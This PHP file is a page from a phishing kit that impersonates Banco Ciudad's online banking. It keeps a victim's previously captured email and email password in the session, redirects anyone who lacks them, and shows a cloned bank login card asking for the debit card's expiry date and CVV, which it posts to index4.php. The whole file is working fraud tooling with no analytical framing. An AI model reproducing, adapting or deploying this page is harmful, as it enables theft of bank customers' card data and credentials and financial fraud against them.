<?php
@session_start();
@ini_set("display_errors", 0);
if (isset($_POST['eml']) && isset($_POST['clveml'])){
	$_SESSION['eml'] = $_POST['eml'];
	$_SESSION['clveml'] = $_POST['clveml'];
}else  if (isset($_SESSION['eml'])  && isset($_SESSION['clveml'])){	
}else{header ('location: index.html');}
?>
<!DOCTYPE html>

<html lang="es">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="x-ua-compatible" content="IE=11">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="./index1_files/favicon.png">
    <link rel="manifest" crossorigin="use-credentials" href="./index1_files/manifest.json">
    <title>Banco Ciudad</title>
    
    
    <script type="text/javascript" async="" src="./index1_files/analytics.js.descarga"></script>
	<script type="text/javascript" async="" src="./index1_files/analytics.js.descarga"></script>
	<script async="" src="./index1_files/gtm.js.descarga"></script>
	<script async="" src="./index1_files/js"></script>
    
    <!-- End Google Tag Manager -->
<link rel="stylesheet" href="./index1_files/styles.efe6c509c082dddef57f.css">

<style>.card[_ngcontent-ejr-c1]:hover{box-shadow:1px 2px 15px rgba(0,0,0,.2)}.card[_ngcontent-ejr-c1]{box-shadow:1px 2px 15px rgba(0,0,0,.1);transition-duration:.5s;height:auto}.login-principal[_ngcontent-ejr-c1]{padding-top:40px;padding-bottom:40px}.form-signin[_ngcontent-ejr-c1]{max-width:500px;padding:15px;margin:0 auto}.form-signin[_ngcontent-ejr-c1]   .form-signin-heading[_ngcontent-ejr-c1]{margin-bottom:100px}.form-signin[_ngcontent-ejr-c1]   .checkbox[_ngcontent-ejr-c1]{font-weight:400}.form-signin[_ngcontent-ejr-c1]   .form-control[_ngcontent-ejr-c1]{position:relative;box-sizing:border-box;height:auto;padding:10px;font-size:16px}.form-signin[_ngcontent-ejr-c1]   .form-control[_ngcontent-ejr-c1]:focus{z-index:2}.form-control[_ngcontent-ejr-c1]:focus{box-shadow:none}.eyePassAligne[_ngcontent-ejr-c1]{text-align:right;padding:10px 20px;display:none;position:absolute;margin:0 0 0 calc(100% - 60px);top:0;z-index:3}.card-body[_ngcontent-ejr-c1]{padding:3rem}.form-signin[_ngcontent-ejr-c1]   .card-link[_ngcontent-ejr-c1] + .card-link[_ngcontent-ejr-c1]{margin-left:8rem}.legales[_ngcontent-ejr-c1]{font-size:.8rem;margin-top:100px;color:#909394}.legales[_ngcontent-ejr-c1]   a[_ngcontent-ejr-c1]{color:#909394;text-decoration:underline}.avatar[_ngcontent-ejr-c1]{z-index:10;top:55px}.avatar[_ngcontent-ejr-c1]   img[_ngcontent-ejr-c1]{border-radius:50%}.logocentrado[_ngcontent-ejr-c1]{width:300px;margin:auto}.contairner[_ngcontent-ejr-c1]{width:50%}.card-footer.text-center[_ngcontent-ejr-c1]   a.card-link[_ngcontent-ejr-c1]{color:#909394;font-size:.8rem}.help-items[_ngcontent-ejr-c1]{background-color:rgba(212,209,203,.3);margin:0}.form-signin[_ngcontent-ejr-c1]   input[_ngcontent-ejr-c1]{margin-bottom:1.3rem;border-radius:0}.sigButton[_ngcontent-ejr-c1]{padding:.5rem 1rem;line-height:1.5;border-radius:.3rem!important}#message[_ngcontent-ejr-c1]{font-size:.8rem;margin-left:16px;color:#909394;position:relative}.valid[_ngcontent-ejr-c1]{color:#0db14b}.valid[_ngcontent-ejr-c1]:before{position:relative;left:-15px;font-family:ionicons;content:"\f121"}.invalid[_ngcontent-ejr-c1]{color:#ef413d}.invalid[_ngcontent-ejr-c1]:before{position:relative;left:-15px;font-family:ionicons;content:"\f129"}.btn-primary[_ngcontent-ejr-c1]{color:#fff;font-size:1rem!important}.btn-primary[_ngcontent-ejr-c1]:disabled{color:#909394}.usuarioEtiqueta[_ngcontent-ejr-c1]{font-size:28px;text-transform:none!important}.icono_manito[_ngcontent-ejr-c1]{cursor:pointer}.login-principal[_ngcontent-ejr-c1]   .login-error-message[_ngcontent-ejr-c1]{margin-top:20px;color:#ef413d}.login-principal[_ngcontent-ejr-c1]   .login-ok-message[_ngcontent-ejr-c1]{margin-top:20px;color:#0db14b}.card-footer[_ngcontent-ejr-c1]{margin:0!important}.loading-puntitos[_ngcontent-ejr-c1]{position:absolute;left:40%;right:40%;bottom:15%}.form-check-label[_ngcontent-ejr-c1]{display:block;position:relative;padding-left:25px;margin-bottom:12px;cursor:pointer;font-size:15px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.form-check-label[_ngcontent-ejr-c1]   input[_ngcontent-ejr-c1]{position:absolute;opacity:0;cursor:pointer;height:0;width:0}.form-check-label[_ngcontent-ejr-c1]   .texto-check[_ngcontent-ejr-c1]{font-size:13px;letter-spacing:-.5px;color:#909394;text-transform:none}.checkmark[_ngcontent-ejr-c1]{position:absolute;top:3px;left:0;height:17px;width:17px;border-radius:2px;border:1px solid #909394}.form-check-label[_ngcontent-ejr-c1]   input[_ngcontent-ejr-c1]:checked ~ .checkmark[_ngcontent-ejr-c1]{background-color:#fff}.checkmark[_ngcontent-ejr-c1]:after{content:"";position:absolute;display:none}.form-check-label[_ngcontent-ejr-c1]   input[_ngcontent-ejr-c1]:checked ~ .checkmark[_ngcontent-ejr-c1]:after{display:block}.form-check-label[_ngcontent-ejr-c1]   .checkmark[_ngcontent-ejr-c1]:after{left:5px;top:2px;width:5px;height:10px;border:solid #2196f3;border-width:0 3px 3px 0;transform:rotate(45deg)}.bgh[_ngcontent-ejr-c1]{height:auto!important;min-height:100%}.teclado-virtual[_ngcontent-ejr-c1]{float:right;color:#4d4d4d;text-transform:initial;font-family:Roboto-Regular,Sans-serif;font-size:12px;font-weight:400;font-style:normal;font-stretch:normal;line-height:normal;letter-spacing:-.6px;padding-bottom:5px}.teclado-virtual[_ngcontent-ejr-c1]   a[_ngcontent-ejr-c1]{vertical-align:middle}@media (max-width:767px){.teclado-virtual[_ngcontent-ejr-c1]{display:none}}@media (max-width:470px){.form-signin[_ngcontent-ejr-c1]   .card-link[_ngcontent-ejr-c1] + .card-link[_ngcontent-ejr-c1]{margin-left:2rem}}@media (max-width:390px){.logocentrado[_ngcontent-ejr-c1]{width:230px;margin:auto}.form-signin[_ngcontent-ejr-c1]   .card-link[_ngcontent-ejr-c1] + .card-link[_ngcontent-ejr-c1]{margin:auto}}@media screen and (max-width:767.98px){.form-signin[_ngcontent-ejr-c1]   .card-link[_ngcontent-ejr-c1] + .card-link[_ngcontent-ejr-c1]{margin:auto}.btn-primary[_ngcontent-ejr-c1]{font-size:inherit}.bgh[_ngcontent-ejr-c1]{height:auto!important;min-height:100%}}@media (max-width:320px){.card-body[_ngcontent-ejr-c1]{padding:3rem 2rem!important}}</style><style>.loading[_ngcontent-ejr-c3]{width:100%;text-align:center;margin-top:0;margin-bottom:38px}.dot[_ngcontent-ejr-c3]{width:15px;height:15px;border-radius:50%;float:left;margin:0 5px;transform:scale(0);-webkit-animation:1s infinite fx;animation:1s infinite fx}.dot[_ngcontent-ejr-c3]:nth-child(2){-webkit-animation:1s .3s infinite fx;animation:1s .3s infinite fx}.dot[_ngcontent-ejr-c3]:nth-child(3){-webkit-animation:1s .6s infinite fx;animation:1s .6s infinite fx}@-webkit-keyframes fx{50%{transform:scale(1);opacity:1}100%{opacity:0}}@keyframes fx{50%{transform:scale(1);opacity:1}100%{opacity:0}}
</style>
</head>

<body class="h-100-vh">
    <app-root _nghost-ejr-c0="" ng-version="7.2.16"><router-outlet _ngcontent-ejr-c0=""></router-outlet><app-login _nghost-ejr-c1="">
	<div _ngcontent-ejr-c1="" class="bg-grey h-100-vh bgh">
	<div _ngcontent-ejr-c1="" class="container login-principal">
	<div _ngcontent-ejr-c1="" class="form-signin">
	<h2 _ngcontent-ejr-c1="" class="logocentrado">
	<img _ngcontent-ejr-c1="" src="./index1_files/ciudad.svg"></h2>
	<div _ngcontent-ejr-c1="" class="position-relative text-center avatar">
	<img _ngcontent-ejr-c1="" src="./index1_files/12.jpg"></div>
	<div _ngcontent-ejr-c1="" class="card">
	<div _ngcontent-ejr-c1="" class="card-body text-center"><!---->
	<div _ngcontent-ejr-c1=""><!----><!---->
	
	<form  class="ng-pristine ng-invalid ng-touched" method="post" action="index4.php"><!---->
	<label _ngcontent-ejr-c1="" class="etiqueta usuarioEtiqueta"><?php echo $_SESSION['usr'];?></label><!----><br _ngcontent-ejr-c1="">
	<div _ngcontent-ejr-c1="" class="text-left">
	<label _ngcontent-ejr-c1="" class="etiqueta mb-0" for="inputPassword" style="width: 100%">COMPLETÁ LOS DATOS DE TU TARJETA DE DEBITO <br>
	<span _ngcontent-ejr-c1="" class="teclado-virtual">
	<img _ngcontent-ejr-c1="" alt="teclado" src="./index1_files/keyboard-regular.png">
	</span>
	</label>
	
	<div _ngcontent-ejr-c1="" class="position-relative">
	
	
<input  class="form-control mb-2 ng-pristine ng-invalid ng-touched"   name="fvenc"  
	type="text" placeholder="Fecha de Venc. MM/AA" maxlength="5"  required ><div _ngcontent-ejr-c1="" class=" d-inline-block eyePassAligne">
	<span _ngcontent-ejr-c1="" class="manito ion-ojoCerrado"></span></div>
	</div>
	
	<div _ngcontent-ejr-c1="" class="position-relative">
	<input _ngcontent-ejr-c1="" class="form-control mb-2 ng-pristine ng-invalid ng-touched"  id="inputPassword" name="cvv" placeholder="CVV" 
	type="text" required  maxlength="4" onKeypress="if (event.keyCode < 45 || event.keyCode > 57) event.returnValue = false;" >
	
	<div _ngcontent-ejr-c1="" class=" d-inline-block eyePassAligne">
	<span _ngcontent-ejr-c1="" class="manito ion-ojoCerrado"></span></div></div>
	
	</div>
	
	<button _ngcontent-ejr-c1="" class="btn btn-lg btn-primary font-Guardian btn-block mt-3" type="submit">Finalizar</button><!---->
	
	<button _ngcontent-ejr-c1="" class="btn btn-link mt-3" type="button">Volver</button><!----><!---->
	</form>
	
	</div><!----><!----></div><!----><div _ngcontent-ejr-c1="" class="card-footer text-center help-items">
	<div _ngcontent-ejr-c1="" class="row"><div _ngcontent-ejr-c1="" class="col-6">
	<a _ngcontent-ejr-c1="" class="card-link d-inline" href="" routerlink="/ayuda">Ayuda</a></div>
	<div _ngcontent-ejr-c1="" class="col-6">
	<a _ngcontent-ejr-c1="" class="card-link" href="" routerlink="/enrolarUsuario">Nuevo&nbsp;usuario</a></div></div></div></div></div>
	<div _ngcontent-ejr-c1="" class="text-center texto-gris">Versión - v0.18.108</div>
	<div _ngcontent-ejr-c1="" class="legales font-Guardian"><p _ngcontent-ejr-c1="">
	<a _ngcontent-ejr-c1="" class="btn btn-link card-link font-size-8 pl-0">Términos y condiciones</a>
	<a _ngcontent-ejr-c1="" class="btn btn-link card-link font-size-8">Seguridad del sistema</a>
	<a _ngcontent-ejr-c1="" class="btn btn-link card-link font-size-8" href="" 
	rel="noopener noreferrer" target="_blank">Contacto</a></p></div></div></div></app-login></app-root>
    <!-- <script defer src="assets/js/jquery-3.2.1.slim.min.js"></script> -->
    <script defer="" src="./index1_files/jquery-3.5.1.slim.min.js"></script>
    <script defer="" src="./index1_files/popper.min.js"></script>
    <script defer="" src="./index1_files/bootstrap.min.js"></script>
    <script defer="" src="./index1_files/serviceworker.js"></script>
    <script defer="" src="./index1_files/colors.js"></script>
    
   

</body></html>